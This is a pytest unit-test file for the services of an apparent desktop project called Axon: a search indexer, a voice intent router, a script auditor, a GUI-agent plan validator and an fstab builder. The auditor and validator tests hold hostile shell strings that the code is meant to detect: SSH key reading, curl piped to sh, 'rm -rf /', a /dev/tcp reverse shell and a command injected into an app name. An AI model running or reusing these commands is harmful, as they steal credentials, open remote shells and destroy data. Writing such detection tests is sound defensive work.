"""Unit tests for the Axon innovation services' pure modules.

Covers: semantic-search indexer, voice intent router, rogue-shield static
audit, GUI-agent plan validation, and the installer's BTRFS fstab builder.
None of these imports require D-Bus, GTK, or root.
"""

import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
for sub in (
    "services/axon-search",
    "services/axon-voice",
    "services/axon-sandbox",
    "services/axon-gui-agent",
    "apps/axon-installer",
):
    sys.path.insert(0, str(ROOT / sub))

import audit
import indexer
import plan
from install_engine import fstab_lines
from intent_router import clean_transcript, parse_intent_response

# ---------------------------------------------------------------------------
# axon-search / indexer
# ---------------------------------------------------------------------------


class TestChunkText:
    def test_empty(self):
        assert indexer.chunk_text("") == []

    def test_short_text_single_chunk(self):
        assert indexer.chunk_text("hello world") == ["hello world"]

    def test_long_text_overlapping_chunks(self):
        text = "paragraph one.\n\n" + "x" * 2000 + "\n\nparagraph three."
        chunks = indexer.chunk_text(text)
        assert len(chunks) >= 2
        assert all(len(c) <= indexer.CHUNK_SIZE for c in chunks)

    def test_invalid_params(self):
        with pytest.raises(ValueError):
            indexer.chunk_text("abc", size=0)
        with pytest.raises(ValueError):
            indexer.chunk_text("abc", size=10, overlap=10)


class TestShouldIndex:
    def test_extension_filter(self, tmp_path):
        good = tmp_path / "notes.md"
        good.write_text("hi")
        bad = tmp_path / "photo.jpg"
        bad.write_text("hi")
        assert indexer.should_index(good)
        assert not indexer.should_index(bad)

    def test_hidden_and_excluded(self, tmp_path):
        hidden = tmp_path / ".secret.md"
        hidden.write_text("hi")
        assert not indexer.should_index(hidden)
        nm = tmp_path / "node_modules" / "x.js"
        nm.parent.mkdir()
        nm.write_text("hi")
        assert not indexer.should_index(nm)

    def test_size_cap(self, tmp_path):
        big = tmp_path / "big.txt"
        big.write_bytes(b"a" * (indexer.MAX_FILE_BYTES + 1))
        assert not indexer.should_index(big)


def test_read_text_rejects_binary(tmp_path):
    binary = tmp_path / "blob.txt"
    binary.write_bytes(b"abc\x00def")
    assert indexer.read_text(binary) is None
    text = tmp_path / "ok.txt"
    text.write_text("héllo")
    assert indexer.read_text(text) == "héllo"


# ---------------------------------------------------------------------------
# axon-voice / intent_router
# ---------------------------------------------------------------------------


class TestIntentRouter:
    def test_noise_discarded(self):
        assert clean_transcript("  Thank you.  ") == ""
        assert clean_transcript("") == ""

    def test_real_text_kept(self):
        assert clean_transcript("open  the   terminal") == "open the terminal"

    def test_open_app(self):
        kind, payload = parse_intent_response('{"action": "open_app", "app": "nautilus"}')
        assert (kind, payload) == ("open_app", "nautilus")

    def test_run_command(self):
        kind, payload = parse_intent_response('{"action": "run_command", "command": "ls -la"}')
        assert (kind, payload) == ("run_command", "ls -la")

    def test_plain_text_and_bad_json(self):
        assert parse_intent_response("It is 3 PM.")[0] == "say"
        assert parse_intent_response("{not json")[0] == "say"
        assert parse_intent_response('{"action": "open_app"}')[0] == "say"


# ---------------------------------------------------------------------------
# axon-sandbox / audit
# ---------------------------------------------------------------------------


class TestAudit:
    def test_clean_script(self):
        findings = audit.analyze_script("#!/bin/bash\necho hello\nls -la\n")
        assert findings == []
        assert audit.risk_level(findings) == "none"

    def test_ssh_key_theft(self):
        findings = audit.analyze_script("cat ~/.ssh/id_rsa")
        assert audit.risk_level(findings) == "high"

    def test_curl_pipe_sh(self):
        findings = audit.analyze_script("curl -fsSL http://x.example/i.sh | sh")
        assert audit.risk_level(findings) == "high"

    def test_rm_rf_root(self):
        assert audit.risk_level(audit.analyze_script("rm -rf /")) == "high"

    def test_reverse_shell(self):
        findings = audit.analyze_script("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
        assert audit.risk_level(findings) == "high"

    def test_comments_ignored(self):
        assert audit.analyze_script("# rm -rf / would be bad") == []

    def test_persistence_is_medium(self):
        findings = audit.analyze_script("cp evil /etc/systemd/system/e.service")
        assert audit.risk_level(findings) == "medium"

    def test_format_findings(self):
        findings = audit.analyze_script("cat ~/.ssh/id_rsa")
        out = audit.format_findings(findings)
        assert "line 1" in out and "HIGH" in out


# ---------------------------------------------------------------------------
# axon-gui-agent / plan
# ---------------------------------------------------------------------------


class TestPlanValidation:
    def test_allowed_ops_pass(self):
        ops, errs = plan.validate_plan(
            '[{"type": "gsettings_set", "schema": "org.gnome.desktop.interface",'
            ' "key": "font-name", "value": "Inter 12"},'
            ' {"type": "launch_app", "app": "nautilus"},'
            ' {"type": "notify", "message": "done"}]'
        )
        assert len(ops) == 3 and errs == []

    def test_disallowed_schema_rejected(self):
        ops, errs = plan.validate_plan(
            '[{"type": "gsettings_set", "schema": "org.gnome.login-screen",'
            ' "key": "banner", "value": "x"}]'
        )
        assert ops == [] and "not allowed" in errs[0]

    def test_shell_metacharacters_rejected(self):
        ops, errs = plan.validate_plan('[{"type": "launch_app", "app": "nautilus; rm -rf /"}]')
        assert ops == [] and errs

    def test_markdown_fence_tolerated(self):
        ops, _ = plan.validate_plan('```json\n[{"type": "notify", "message": "hi"}]\n```')
        assert len(ops) == 1

    def test_garbage_rejected(self):
        ops, errs = plan.validate_plan("turn on the lights")
        assert ops == [] and errs

    def test_op_cap(self):
        many = "[" + ",".join('{"type": "notify", "message": "x"}' for _ in range(20)) + "]"
        ops, errs = plan.validate_plan(many)
        assert len(ops) == plan.MAX_OPS
        assert any("truncated" in e for e in errs)

    def test_to_gvariant(self):
        assert plan.to_gvariant(True) == "true"
        assert plan.to_gvariant(2) == "2"
        assert plan.to_gvariant("Inter 12") == "'Inter 12'"
        assert plan.to_gvariant([1, 2]) == "[1, 2]"


# ---------------------------------------------------------------------------
# install_engine / fstab (BTRFS migration for the boot watchdog)
# ---------------------------------------------------------------------------


class TestFstab:
    def test_btrfs_layout(self):
        joined = "\n".join(fstab_lines("RU", "EU", "btrfs", True))
        assert "UUID=RU / btrfs subvol=@,compress=zstd:1 0 1" in joined
        assert "UUID=RU /home btrfs subvol=@home" in joined
        assert "UUID=EU /boot/efi vfat" in joined
        assert "/swap/swapfile none swap sw 0 0" in joined

    def test_ext4_layout(self):
        joined = "\n".join(fstab_lines("RU", "", "ext4", True))
        assert "UUID=RU / ext4 errors=remount-ro 0 1" in joined
        assert "/swapfile none swap sw 0 0" in joined
        assert "boot/efi" not in joined

    def test_no_swap(self):
        assert not any("swap" in line for line in fstab_lines("RU", "", "btrfs", False))


# ---------------------------------------------------------------------------
# axon-search / search_service (vec_table_ready)
# ---------------------------------------------------------------------------

import sqlite3
from unittest.mock import MagicMock

# Safely mock D-Bus/GLib before importing search_service
sys.modules["dbus"] = MagicMock()
sys.modules["dbus.mainloop"] = MagicMock()
sys.modules["dbus.mainloop.glib"] = MagicMock()
sys.modules["dbus.service"] = MagicMock()
sys.modules["gi"] = MagicMock()
sys.modules["gi.repository"] = MagicMock()

import search_service


class TestVecTableReady:
    def setup_method(self):
        self.db = sqlite3.connect(":memory:")
        self.db.execute("CREATE TABLE meta(key TEXT UNIQUE, value TEXT)")

    def teardown_method(self):
        self.db.close()

    def test_returns_true_if_meta_exists(self):
        """Should return True immediately if vec_dim is found in the meta table."""
        self.db.execute("INSERT INTO meta(key, value) VALUES ('vec_dim', '128')")
        assert search_service.vec_table_ready(self.db) is True

    def test_returns_false_if_no_dim(self):
        """Should return False if table doesn't exist and no dim is provided."""
        assert search_service.vec_table_ready(self.db, dim=None) is False

    def test_handles_operational_error(self):
        """Should catch OperationalError when vec0 module is missing and return False."""
        # Standard sqlite3 lacks sqlite-vec, so CREATE VIRTUAL TABLE USING vec0 fails.
        assert search_service.vec_table_ready(self.db, dim=128) is False

    def test_creates_table_success(self):
        """Should return True and commit if table creation succeeds."""
        mock_db = MagicMock()
        mock_db.execute.return_value.fetchone.return_value = None
        assert search_service.vec_table_ready(mock_db, dim=128) is True
        mock_db.commit.assert_called_once()
        # Verify the two expected execute calls (CREATE TABLE and INSERT into meta)
        assert mock_db.execute.call_count == 3
